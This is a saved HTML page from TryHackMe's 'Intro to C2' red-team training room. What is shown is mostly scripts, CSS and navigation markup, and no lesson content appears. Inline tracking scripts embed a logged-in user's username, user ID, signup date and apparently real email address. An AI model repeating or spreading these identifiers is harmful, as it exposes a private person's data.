<!DOCTYPE html>
<!-- saved from url=(0036)https://tryhackme.com/room/introtoc2 -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>TryHackMe | Intro to C2</title>
<meta name="description" content="Learn the essentials of Command and Control to help you become a better Red Teamer and simplify your next Red Team assessment!">
<meta name="og:description" content="Learn the essentials of Command and Control to help you become a better Red Teamer and simplify your next Red Team assessment!">
<meta name="keywords" content="cyber,security,cyber security,cyber security training,coding,computer,bitcoin,hacking,hackers,hacks,hack,exploits,keylogger,learn,poc">
<meta name="viewport" content="width=device-width,initial-scale=1.0">

<meta property="og:site_name" content="TryHackMe">
<meta property="og:title" content="TryHackMe | Intro to C2">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/room-icons/89152d71d2f69101482059abb33f5992.png">
<meta property="og:url" content="https://tryhackme.com/room/introtoc2">
<meta name="twitter:image" content="https://tryhackme.com/img/meta/default.png">
<meta property="og:description" content="Learn the essentials of Command and Control to help you become a better Red Teamer and simplify your next Red Team assessment!">

<script type="text/javascript" async="" src="./TryHackMe _ Intro to C2_files/pgpbhph6"></script><script src="./TryHackMe _ Intro to C2_files/jquery.min.js"></script>
<script src="./TryHackMe _ Intro to C2_files/popper.min.js"></script>
<link rel="stylesheet" href="./TryHackMe _ Intro to C2_files/boostrap431.min.css">
<script src="./TryHackMe _ Intro to C2_files/bootstrap431.min.js"></script>
<link rel="stylesheet" href="./TryHackMe _ Intro to C2_files/animate.min.css">
<link rel="stylesheet" href="./TryHackMe _ Intro to C2_files/all.css" integrity="sha384-ekOryaXPbeCpWQNxMwSWVvQ0+1VrStoPJq54shlYhR8HzQgig1v5fas6YgOqLoKz" crossorigin="anonymous">
<link rel="icon" type="image/png" href="https://assets.tryhackme.com/img/favicon.png">
<link rel="stylesheet" media="screen" href="./TryHackMe _ Intro to C2_files/general-style.css">
<script src="./TryHackMe _ Intro to C2_files/script.js"></script>
<script src="./TryHackMe _ Intro to C2_files/validation.js"></script>

<link rel="stylesheet" type="text/css" href="./TryHackMe _ Intro to C2_files/cookieconsent.min.css">
<script src="./TryHackMe _ Intro to C2_files/cookieconsent.min.js"></script>
<script async="" src="./TryHackMe _ Intro to C2_files/js"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
  
    gtag('config', 'G-Z8D4WL3D4P');
  </script>


<script>
    window.intercomSettings = {
      api_base: "https://api-iam.intercom.io",
      app_id: "pgpbhph6"
    };
  </script>
<script>
    (function (h, o, t, j, a, r) {
      h.hj = h.hj || function () { (h.hj.q = h.hj.q || []).push(arguments) };
      h._hjSettings = { hjid: 1950941, hjsv: 6 };
      a = o.getElementsByTagName('head')[0];
      r = o.createElement('script'); r.async = 1;
      r.src = t + h._hjSettings.hjid + j + h._hjSettings.hjsv;
      a.appendChild(r);
    })(window, document, 'https://static.hotjar.com/c/hotjar-', '.js?sv=');
  </script><script async="" src="./TryHackMe _ Intro to C2_files/hotjar-1950941.js"></script>
<script>
    /* Global javascript variables */

    // Used inside script.js for createRooms compelted users.
    const username = 'Silv3rsurf3r'
    const subscribed = '1'
    const level = '10'
    const intercomEnabled = 'true'
  </script>
<script>
    //add back tracking info
    const userId = "63d14e7f857ae10041bb192f"
    let tutorialComplete = false
    if ('false' == "true") {
      tutorialComplete = true
    }
    if(intercomEnabled === "true"){
      window.intercomSettings = {
        api_base: "https://api-iam.intercom.io",
        app_id: "pgpbhph6",
        user_id: userId,
        username: username,
        email: "giftonpaul@karunya.edu.in",
        created_at: Math.floor(new Date("Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)").getTime() / 1000) // Signup date as a Unix timestamp
      };
    }
    window.hj('identify', userId, {
      displayName: username,
      subscribed: "1",
      dateSignUp: "Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)",
      experience: "advanced"
    })
  </script>
<script type="application/ld+json">

   {
      "@context":"https://schema.org",
      "@type":"Organization",
      "url":"https://tryhackme.com",
      "name":"TryHackMe",
      "logo":"https://tryhackme.com/img/favicon.png",
      "description":"TryHackMe is a free online platform for learning cyber security, using hands-on exercises and labs, all through your browser!",
      "email": "support@tryhackme.com",
      "sameAs":[
         "https://www.linkedin.com/company/tryhackme",
         "https://twitter.com/realtryhackme"
      ]
   }

</script>
<script>
    console.log(`%c
      ------------------
      < Happy Hacking! >
      ------------------
              \\   ^__^
               \\  (oo)\\_______
                  (__)\\       )\\/\\
                      ||----w |
                      ||     ||`, "font-family:monospace")
  </script>
<script>
  (function(){var w=window;var ic=w.Intercom;if(typeof ic==="function"){ic('reattach_activator');ic('update',w.intercomSettings);}else{var d=document;var i=function(){i.c(arguments);};i.q=[];i.c=function(args){i.q.push(args);};w.Intercom=i;var l=function(){var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://widget.intercom.io/widget/pgpbhph6';var x=d.getElementsByTagName('script')[0];x.parentNode.insertBefore(s,x);};if(document.readyState==='complete'){l();}else if(w.attachEvent){w.attachEvent('onload',l);}else{w.addEventListener('load',l,false);}}})();
</script>
<script src="./TryHackMe _ Intro to C2_files/socket.io.js"></script><script>
  let socket = io.connect({
    transports: ['websocket'],
    reconnection: true,
    reconnectionDelay: 1000,
    reconnectionAttempts: 10
  })
</script><style type="text/css">.apexcharts-canvas {
  position: relative;
  user-select: none;
  /* cannot give overflow: hidden as it will crop tooltips which overflow outside chart area */
}


/* scrollbar is not visible by default for legend, hence forcing the visibility */
.apexcharts-canvas ::-webkit-scrollbar {
  -webkit-appearance: none;
  width: 6px;
}

.apexcharts-canvas ::-webkit-scrollbar-thumb {
  border-radius: 4px;
  background-color: rgba(0, 0, 0, .5);
  box-shadow: 0 0 1px rgba(255, 255, 255, .5);
  -webkit-box-shadow: 0 0 1px rgba(255, 255, 255, .5);
}


.apexcharts-inner {
  position: relative;
}

.apexcharts-text tspan {
  font-family: inherit;
}

.legend-mouseover-inactive {
  transition: 0.15s ease all;
  opacity: 0.20;
}

.apexcharts-series-collapsed {
  opacity: 0;
}

.apexcharts-tooltip {
  border-radius: 5px;
  box-shadow: 2px 2px 6px -4px #999;
  cursor: default;
  font-size: 14px;
  left: 62px;
  opacity: 0;
  pointer-events: none;
  position: absolute;
  top: 20px;
  display: flex;
  flex-direction: column;
  overflow: hidden;
  white-space: nowrap;
  z-index: 12;
  transition: 0.15s ease all;
}

.apexcharts-tooltip.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-tooltip.apexcharts-theme-light {
  border: 1px solid #e3e3e3;
  background: rgba(255, 255, 255, 0.96);
}

.apexcharts-tooltip.apexcharts-theme-dark {
  color: #fff;
  background: rgba(30, 30, 30, 0.8);
}

.apexcharts-tooltip * {
  font-family: inherit;
}


.apexcharts-tooltip-title {
  padding: 6px;
  font-size: 15px;
  margin-bottom: 4px;
}

.apexcharts-tooltip.apexcharts-theme-light .apexcharts-tooltip-title {
  background: #ECEFF1;
  border-bottom: 1px solid #ddd;
}

.apexcharts-tooltip.apexcharts-theme-dark .apexcharts-tooltip-title {
  background: rgba(0, 0, 0, 0.7);
  border-bottom: 1px solid #333;
}

.apexcharts-tooltip-text-y-value,
.apexcharts-tooltip-text-goals-value,
.apexcharts-tooltip-text-z-value {
  display: inline-block;
  font-weight: 600;
  margin-left: 5px;
}

.apexcharts-tooltip-text-y-label:empty,
.apexcharts-tooltip-text-y-value:empty,
.apexcharts-tooltip-text-goals-label:empty,
.apexcharts-tooltip-text-goals-value:empty,
.apexcharts-tooltip-text-z-value:empty {
  display: none;
}

.apexcharts-tooltip-text-y-value,
.apexcharts-tooltip-text-goals-value,
.apexcharts-tooltip-text-z-value {
  font-weight: 600;
}

.apexcharts-tooltip-text-goals-label, 
.apexcharts-tooltip-text-goals-value {
  padding: 6px 0 5px;
}

.apexcharts-tooltip-goals-group, 
.apexcharts-tooltip-text-goals-label, 
.apexcharts-tooltip-text-goals-value {
  display: flex;
}
.apexcharts-tooltip-text-goals-label:not(:empty),
.apexcharts-tooltip-text-goals-value:not(:empty) {
  margin-top: -6px;
}

.apexcharts-tooltip-marker {
  width: 12px;
  height: 12px;
  position: relative;
  top: 0px;
  margin-right: 10px;
  border-radius: 50%;
}

.apexcharts-tooltip-series-group {
  padding: 0 10px;
  display: none;
  text-align: left;
  justify-content: left;
  align-items: center;
}

.apexcharts-tooltip-series-group.apexcharts-active .apexcharts-tooltip-marker {
  opacity: 1;
}

.apexcharts-tooltip-series-group.apexcharts-active,
.apexcharts-tooltip-series-group:last-child {
  padding-bottom: 4px;
}

.apexcharts-tooltip-series-group-hidden {
  opacity: 0;
  height: 0;
  line-height: 0;
  padding: 0 !important;
}

.apexcharts-tooltip-y-group {
  padding: 6px 0 5px;
}

.apexcharts-tooltip-box, .apexcharts-custom-tooltip {
  padding: 4px 8px;
}

.apexcharts-tooltip-boxPlot {
  display: flex;
  flex-direction: column-reverse;
}

.apexcharts-tooltip-box>div {
  margin: 4px 0;
}

.apexcharts-tooltip-box span.value {
  font-weight: bold;
}

.apexcharts-tooltip-rangebar {
  padding: 5px 8px;
}

.apexcharts-tooltip-rangebar .category {
  font-weight: 600;
  color: #777;
}

.apexcharts-tooltip-rangebar .series-name {
  font-weight: bold;
  display: block;
  margin-bottom: 5px;
}

.apexcharts-xaxistooltip {
  opacity: 0;
  padding: 9px 10px;
  pointer-events: none;
  color: #373d3f;
  font-size: 13px;
  text-align: center;
  border-radius: 2px;
  position: absolute;
  z-index: 10;
  background: #ECEFF1;
  border: 1px solid #90A4AE;
  transition: 0.15s ease all;
}

.apexcharts-xaxistooltip.apexcharts-theme-dark {
  background: rgba(0, 0, 0, 0.7);
  border: 1px solid rgba(0, 0, 0, 0.5);
  color: #fff;
}

.apexcharts-xaxistooltip:after,
.apexcharts-xaxistooltip:before {
  left: 50%;
  border: solid transparent;
  content: " ";
  height: 0;
  width: 0;
  position: absolute;
  pointer-events: none;
}

.apexcharts-xaxistooltip:after {
  border-color: rgba(236, 239, 241, 0);
  border-width: 6px;
  margin-left: -6px;
}

.apexcharts-xaxistooltip:before {
  border-color: rgba(144, 164, 174, 0);
  border-width: 7px;
  margin-left: -7px;
}

.apexcharts-xaxistooltip-bottom:after,
.apexcharts-xaxistooltip-bottom:before {
  bottom: 100%;
}

.apexcharts-xaxistooltip-top:after,
.apexcharts-xaxistooltip-top:before {
  top: 100%;
}

.apexcharts-xaxistooltip-bottom:after {
  border-bottom-color: #ECEFF1;
}

.apexcharts-xaxistooltip-bottom:before {
  border-bottom-color: #90A4AE;
}

.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:after {
  border-bottom-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:before {
  border-bottom-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-top:after {
  border-top-color: #ECEFF1
}

.apexcharts-xaxistooltip-top:before {
  border-top-color: #90A4AE;
}

.apexcharts-xaxistooltip-top.apexcharts-theme-dark:after {
  border-top-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-top.apexcharts-theme-dark:before {
  border-top-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-yaxistooltip {
  opacity: 0;
  padding: 4px 10px;
  pointer-events: none;
  color: #373d3f;
  font-size: 13px;
  text-align: center;
  border-radius: 2px;
  position: absolute;
  z-index: 10;
  background: #ECEFF1;
  border: 1px solid #90A4AE;
}

.apexcharts-yaxistooltip.apexcharts-theme-dark {
  background: rgba(0, 0, 0, 0.7);
  border: 1px solid rgba(0, 0, 0, 0.5);
  color: #fff;
}

.apexcharts-yaxistooltip:after,
.apexcharts-yaxistooltip:before {
  top: 50%;
  border: solid transparent;
  content: " ";
  height: 0;
  width: 0;
  position: absolute;
  pointer-events: none;
}

.apexcharts-yaxistooltip:after {
  border-color: rgba(236, 239, 241, 0);
  border-width: 6px;
  margin-top: -6px;
}

.apexcharts-yaxistooltip:before {
  border-color: rgba(144, 164, 174, 0);
  border-width: 7px;
  margin-top: -7px;
}

.apexcharts-yaxistooltip-left:after,
.apexcharts-yaxistooltip-left:before {
  left: 100%;
}

.apexcharts-yaxistooltip-right:after,
.apexcharts-yaxistooltip-right:before {
  right: 100%;
}

.apexcharts-yaxistooltip-left:after {
  border-left-color: #ECEFF1;
}

.apexcharts-yaxistooltip-left:before {
  border-left-color: #90A4AE;
}

.apexcharts-yaxistooltip-left.apexcharts-theme-dark:after {
  border-left-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-left.apexcharts-theme-dark:before {
  border-left-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-right:after {
  border-right-color: #ECEFF1;
}

.apexcharts-yaxistooltip-right:before {
  border-right-color: #90A4AE;
}

.apexcharts-yaxistooltip-right.apexcharts-theme-dark:after {
  border-right-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-right.apexcharts-theme-dark:before {
  border-right-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip.apexcharts-active {
  opacity: 1;
}

.apexcharts-yaxistooltip-hidden {
  display: none;
}

.apexcharts-xcrosshairs,
.apexcharts-ycrosshairs {
  pointer-events: none;
  opacity: 0;
  transition: 0.15s ease all;
}

.apexcharts-xcrosshairs.apexcharts-active,
.apexcharts-ycrosshairs.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-ycrosshairs-hidden {
  opacity: 0;
}

.apexcharts-selection-rect {
  cursor: move;
}

.svg_select_boundingRect, .svg_select_points_rot {
  pointer-events: none;
  opacity: 0;
  visibility: hidden;
}
.apexcharts-selection-rect + g .svg_select_boundingRect,
.apexcharts-selection-rect + g .svg_select_points_rot {
  opacity: 0;
  visibility: hidden;
}

.apexcharts-selection-rect + g .svg_select_points_l,
.apexcharts-selection-rect + g .svg_select_points_r {
  cursor: ew-resize;
  opacity: 1;
  visibility: visible;
}

.svg_select_points {
  fill: #efefef;
  stroke: #333;
  rx: 2;
}

.apexcharts-svg.apexcharts-zoomable.hovering-zoom {
  cursor: crosshair
}

.apexcharts-svg.apexcharts-zoomable.hovering-pan {
  cursor: move
}

.apexcharts-zoom-icon,
.apexcharts-zoomin-icon,
.apexcharts-zoomout-icon,
.apexcharts-reset-icon,
.apexcharts-pan-icon,
.apexcharts-selection-icon,
.apexcharts-menu-icon,
.apexcharts-toolbar-custom-icon {
  cursor: pointer;
  width: 20px;
  height: 20px;
  line-height: 24px;
  color: #6E8192;
  text-align: center;
}

.apexcharts-zoom-icon svg,
.apexcharts-zoomin-icon svg,
.apexcharts-zoomout-icon svg,
.apexcharts-reset-icon svg,
.apexcharts-menu-icon svg {
  fill: #6E8192;
}

.apexcharts-selection-icon svg {
  fill: #444;
  transform: scale(0.76)
}

.apexcharts-theme-dark .apexcharts-zoom-icon svg,
.apexcharts-theme-dark .apexcharts-zoomin-icon svg,
.apexcharts-theme-dark .apexcharts-zoomout-icon svg,
.apexcharts-theme-dark .apexcharts-reset-icon svg,
.apexcharts-theme-dark .apexcharts-pan-icon svg,
.apexcharts-theme-dark .apexcharts-selection-icon svg,
.apexcharts-theme-dark .apexcharts-menu-icon svg,
.apexcharts-theme-dark .apexcharts-toolbar-custom-icon svg {
  fill: #f3f4f5;
}

.apexcharts-canvas .apexcharts-zoom-icon.apexcharts-selected svg,
.apexcharts-canvas .apexcharts-selection-icon.apexcharts-selected svg,
.apexcharts-canvas .apexcharts-reset-zoom-icon.apexcharts-selected svg {
  fill: #008FFB;
}

.apexcharts-theme-light .apexcharts-selection-icon:not(.apexcharts-selected):hover svg,
.apexcharts-theme-light .apexcharts-zoom-icon:not(.apexcharts-selected):hover svg,
.apexcharts-theme-light .apexcharts-zoomin-icon:hover svg,
.apexcharts-theme-light .apexcharts-zoomout-icon:hover svg,
.apexcharts-theme-light .apexcharts-reset-icon:hover svg,
.apexcharts-theme-light .apexcharts-menu-icon:hover svg {
  fill: #333;
}

.apexcharts-selection-icon,
.apexcharts-menu-icon {
  position: relative;
}

.apexcharts-reset-icon {
  margin-left: 5px;
}

.apexcharts-zoom-icon,
.apexcharts-reset-icon,
.apexcharts-menu-icon {
  transform: scale(0.85);
}

.apexcharts-zoomin-icon,
.apexcharts-zoomout-icon {
  transform: scale(0.7)
}

.apexcharts-zoomout-icon {
  margin-right: 3px;
}

.apexcharts-pan-icon {
  transform: scale(0.62);
  position: relative;
  left: 1px;
  top: 0px;
}

.apexcharts-pan-icon svg {
  fill: #fff;
  stroke: #6E8192;
  stroke-width: 2;
}

.apexcharts-pan-icon.apexcharts-selected svg {
  stroke: #008FFB;
}

.apexcharts-pan-icon:not(.apexcharts-selected):hover svg {
  stroke: #333;
}

.apexcharts-toolbar {
  position: absolute;
  z-index: 11;
  max-width: 176px;
  text-align: right;
  border-radius: 3px;
  padding: 0px 6px 2px 6px;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.apexcharts-menu {
  background: #fff;
  position: absolute;
  top: 100%;
  border: 1px solid #ddd;
  border-radius: 3px;
  padding: 3px;
  right: 10px;
  opacity: 0;
  min-width: 110px;
  transition: 0.15s ease all;
  pointer-events: none;
}

.apexcharts-menu.apexcharts-menu-open {
  opacity: 1;
  pointer-events: all;
  transition: 0.15s ease all;
}

.apexcharts-menu-item {
  padding: 6px 7px;
  font-size: 12px;
  cursor: pointer;
}

.apexcharts-theme-light .apexcharts-menu-item:hover {
  background: #eee;
}

.apexcharts-theme-dark .apexcharts-menu {
  background: rgba(0, 0, 0, 0.7);
  color: #fff;
}

@media screen and (min-width: 768px) {
  .apexcharts-canvas:hover .apexcharts-toolbar {
    opacity: 1;
  }
}

.apexcharts-datalabel.apexcharts-element-hidden {
  opacity: 0;
}

.apexcharts-pie-label,
.apexcharts-datalabels,
.apexcharts-datalabel,
.apexcharts-datalabel-label,
.apexcharts-datalabel-value {
  cursor: default;
  pointer-events: none;
}

.apexcharts-pie-label-delay {
  opacity: 0;
  animation-name: opaque;
  animation-duration: 0.3s;
  animation-fill-mode: forwards;
  animation-timing-function: ease;
}

.apexcharts-canvas .apexcharts-element-hidden {
  opacity: 0;
}

.apexcharts-hide .apexcharts-series-points {
  opacity: 0;
}

.apexcharts-gridline,
.apexcharts-annotation-rect,
.apexcharts-tooltip .apexcharts-marker,
.apexcharts-area-series .apexcharts-area,
.apexcharts-line,
.apexcharts-zoom-rect,
.apexcharts-toolbar svg,
.apexcharts-area-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
.apexcharts-line-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
.apexcharts-radar-series path,
.apexcharts-radar-series polygon {
  pointer-events: none;
}


/* markers */

.apexcharts-marker {
  transition: 0.15s ease all;
}

@keyframes opaque {
  0% {
    opacity: 0;
  }
  100% {
    opacity: 1;
  }
}


/* Resize generated styles */

@keyframes resizeanim {
  from {
    opacity: 0;
  }
  to {
    opacity: 0;
  }
}

.resize-triggers {
  animation: 1ms resizeanim;
  visibility: hidden;
  opacity: 0;
}

.resize-triggers,
.resize-triggers>div,
.contract-trigger:before {
  content: " ";
  display: block;
  position: absolute;
  top: 0;
  left: 0;
  height: 100%;
  width: 100%;
  overflow: hidden;
}

.resize-triggers>div {
  background: #eee;
  overflow: auto;
}

.contract-trigger:before {
  width: 200%;
  height: 200%;
}</style><style data-jss="" data-meta="MuiDialog">
@media print {
  .MuiDialog-root {
    position: absolute !important;
  }
}
.MuiDialog-scrollPaper {
  display: flex;
  align-items: center;
  justify-content: center;
}
.MuiDialog-scrollBody {
  overflow-x: hidden;
  overflow-y: auto;
  text-align: center;
}
.MuiDialog-scrollBody:after {
  width: 0;
  height: 100%;
  content: "";
  display: inline-block;
  vertical-align: middle;
}
.MuiDialog-container {
  height: 100%;
  outline: 0;
}
@media print {
  .MuiDialog-container {
    height: auto;
  }
}
.MuiDialog-paper {
  margin: 32px;
  position: relative;
  overflow-y: auto;
}
@media print {
  .MuiDialog-paper {
    box-shadow: none;
    overflow-y: visible;
  }
}
.MuiDialog-paperScrollPaper {
  display: flex;
  max-height: calc(100% - 64px);
  flex-direction: column;
}
.MuiDialog-paperScrollBody {
  display: inline-block;
  text-align: left;
  vertical-align: middle;
}
.MuiDialog-paperWidthFalse {
  max-width: calc(100% - 64px);
}
.MuiDialog-paperWidthXs {
  max-width: 444px;
}
@media (max-width:507.95px) {
  .MuiDialog-paperWidthXs.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthSm {
  max-width: 600px;
}
@media (max-width:663.95px) {
  .MuiDialog-paperWidthSm.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthMd {
  max-width: 960px;
}
@media (max-width:1023.95px) {
  .MuiDialog-paperWidthMd.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthLg {
  max-width: 1280px;
}
@media (max-width:1343.95px) {
  .MuiDialog-paperWidthLg.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthXl {
  max-width: 1920px;
}
@media (max-width:1983.95px) {
  .MuiDialog-paperWidthXl.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperFullWidth {
  width: calc(100% - 64px);
}
.MuiDialog-paperFullScreen {
  width: 100%;
  height: 100%;
  margin: 0;
  max-width: 100%;
  max-height: none;
  border-radius: 0;
}
.MuiDialog-paperFullScreen.MuiDialog-paperScrollBody {
  margin: 0;
  max-width: 100%;
}
</style><script async="" src="./TryHackMe _ Intro to C2_files/modules.5957fbf26d1b525b5a12.js" charset="utf-8"></script><style></style></head>


<body><div role="dialog" aria-live="polite" aria-label="cookieconsent" aria-describedby="cookieconsent:desc" class="cc-window cc-floating cc-type-info cc-theme-classic cc-bottom cc-right cc-color-override-382972913 cc-invisible" style="display: none;"><!--googleoff: all--><span id="cookieconsent:desc" class="cc-message">We use cookies to ensure you get the best user experience. For more information contact us. <a aria-label="learn more about cookies" role="button" tabindex="0" class="cc-link" href="https://tryhackme.com/legal/terms-of-use" target="_blank">Read more</a></span><div class="cc-compliance"><a aria-label="dismiss cookie message" role="button" tabindex="0" class="cc-btn cc-dismiss">Got it!</a></div><!--googleon: all--></div>
<link href="./TryHackMe _ Intro to C2_files/scoreboard.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Intro to C2_files/introjs.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Intro to C2_files/slideout.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Intro to C2_files/public-rooms.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Intro to C2_files/asciinema-player.css" rel="stylesheet" type="text/css"> 
<link href="./TryHackMe _ Intro to C2_files/prism.css" rel="stylesheet" type="text/css"> 
<link href="./TryHackMe _ Intro to C2_files/magnific-popup.css" rel="stylesheet" type="text/css"> 
<script src="./TryHackMe _ Intro to C2_files/lottie-player.js"></script>

<div id="room-content">
<div id="room-content-main">
<nav class="navbar navbar-expand-md navbar-dark navbar-color-loggedin navbar-main">
<div class="container">
<button id="thm-mobile-nav-open" class="thm-nav__hamburger-btn" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Open mobile navigation">
<span class="thm-nav__hamburger-lines"></span>
</button>
<div class="collapse navbar-collapse justify-content-end" id="navbarSupportedContent">
<div class="navbar-brand" href="/">
<a href="https://tryhackme.com/dashboard">
<img width="115px" src="./TryHackMe _ Intro to C2_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo">
</a>
</div>
<ul class="navbar-nav mr-auto mt-2 mt-lg-0 navbar-pagelinks">
<li class="nav-item ">
<a class="nav-link" href="https://tryhackme.com/dashboard">
<i class="navbar-item-icon far fa-browser"></i>
<div class="navbar-item-text">Dashboard</div>
</a>
</li>
<li class="nav-item active" id="nav-learn">
<a class="nav-link" href="https://tryhackme.com/hacktivities">
<i class="navbar-item-icon far fa-book-open"></i>
<div class="navbar-item-text">Learn</div>
</a>
</li>
<li class="nav-item  dropdown lite-removable">
<a id="nav-other" class="nav-link" href="https://tryhackme.com/room/introtoc2#" data-toggle="dropdown">
<i class="navbar-item-icon far fa-trophy"></i>
<div class="navbar-item-text">Compete</div>
</a>
<div class="dropdown-menu" aria-labelledby="navbarDropdown">
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/leaderboards">
<div class="dropdown-menu-icon">
<i class="fas fa-trophy"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">Leaderboards</span>
<div class="text-lgray size-12">Platform Rankings</div>
</div>
</a>
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/games/koth">
<div class="dropdown-menu-icon">
<i class="fas fa-crown"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">King of the Hill</span>
<div class="text-lgray size-12">Attack &amp; Defend</div>
</div>
</a>
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/workspace">
<div class="dropdown-menu-icon">
<i class="fas fa-user-friends"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">Workspace</span>
<div class="text-lgray size-12">Compete &amp; Collaborate</div>
</div>
</a>
</div>
</li>
<li class="nav-item dropdown">
<a data-cy="nav-other-menu-button" id="nav-other" class="nav-link" href="https://tryhackme.com/room/introtoc2#" data-toggle="dropdown">
<i class="navbar-item-icon far fa-ellipsis-h-alt"></i>
<div class="navbar-item-text">Other</div>
</a>
<div data-cy="nav-other-menu" class="dropdown-menu dropdown-menu-center large-dropdown" aria-labelledby="navbarDropdown">
<span class="dropdown-menu-arrow"></span>
<a class="dropdown-item" href="https://tryhackme.com/resources">Resources</a>
<a class="dropdown-item" href="https://tryhackme.com/subscriptions">Buy Vouchers</a>
<a class="dropdown-item" href="https://tryhackme.com/develop-rooms">Develop Rooms</a>
<a class="dropdown-item" href="https://tryhackme.com/business">For Business</a>
<a class="dropdown-item" href="https://tryhackme.com/classrooms">For Education</a>
<a class="dropdown-item" target="_blank" href="https://store.tryhackme.com/">Swag Shop</a>
<a class="dropdown-item" href="https://tryhackme.com/glossary">Glossary</a>
</div>
</li>
</ul>
<ul class="navbar-nav navbar-right options vertical-align-custom">
<li class="nav-item" data-toggle="modal" data-target="#navConnModal">
<div id="thm-connection-status" class="thm-disconnected" style="display: flex;">
<div id="thm-connection-status-dot" class="dot-small"></div> <span id="thm-connection-status-txt" class="ml-2 size-18 text-white">Access Machines</span>
</div>
</li>
<li class="nav-item">
<div class="nav-item-streak">
<span id="streak-popover" class="size-24" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;p class=&#39;mb-2&#39;&gt;Complete a question every day to build your hacking streak, earn badges and streak freezes!&lt;/p&gt;

&lt;div class=&#39;size-12 faded&#39;&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;7&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Access to networks, Streak freeze&lt;/p&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;30&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Streak freeze&lt;/p&gt;
  &lt;p class=&#39;m-0&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;45&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = 5% off swag&lt;/p&gt;
&lt;/div&gt;
 &lt;div class=&#39;size-12 text-center faded mt-2 font-italic&#39;&gt;1 
        day streak freeze equipped&lt;/div&gt;" data-original-title="" title="">
<span id="user-streak" data-streak="7" class="hacker-green">7 <i class="fas fa-fire-alt"></i></span>
</span>
<script>
                            let usersStreak = { // Global variable, used in rooms logic
                                streakFirstAnswered: new Date('Mon Jul 10 2023 03:13:45 GMT+0100 (British Summer Time)'),
                                streakLastAnswered: new Date('Sun Jul 16 2023 18:47:44 GMT+0100 (British Summer Time)'),
                                usersTimezone: 'Asia/Kolkata',
                                streakFreeze: 1
                            };
                            setSidebarStreaks(usersStreak.streakFirstAnswered, usersStreak.streakLastAnswered, usersStreak.usersTimezone, usersStreak.streakFreeze)
                        </script>
</div>
</li>
<li class="nav-item dropdown" id="notification-navitem">
<a class="nav-link vertical-align-custom size-22 pl-0" href="https://tryhackme.com/room/introtoc2#" id="notification-btn" role="button" data-toggle="dropdown">
<i id="notification-icon" class="fal fa-bell"></i>
<div id="notification-dot"></div>
</a>
<div id="nav-notification" class="dropdown-menu dropdown-menu-right">
<div id="notification-header">Notifications</div>
<div id="nav-notifications">
<div class="text-center mt-2 mb-2"><i>Loading..</i></div>
</div>
</div>
</li>
<li class="nav-item dropdown">
<a class="nav-link dropdown-toggle remove-arrow p-0" href="https://tryhackme.com/room/introtoc2#" id="navbarAvatarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
<img src="./TryHackMe _ Intro to C2_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar">
</a>
<div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarAvatarDropdown">
<a class="dropdown-item" href="https://tryhackme.com/profile">Profile</a>
<a class="dropdown-item" href="https://tryhackme.com/referrals">Refer a friend</a>
<a class="dropdown-item" href="https://tryhackme.com/badges">Badges</a>
<a class="dropdown-item" href="https://tryhackme.com/rooms">My Rooms</a>
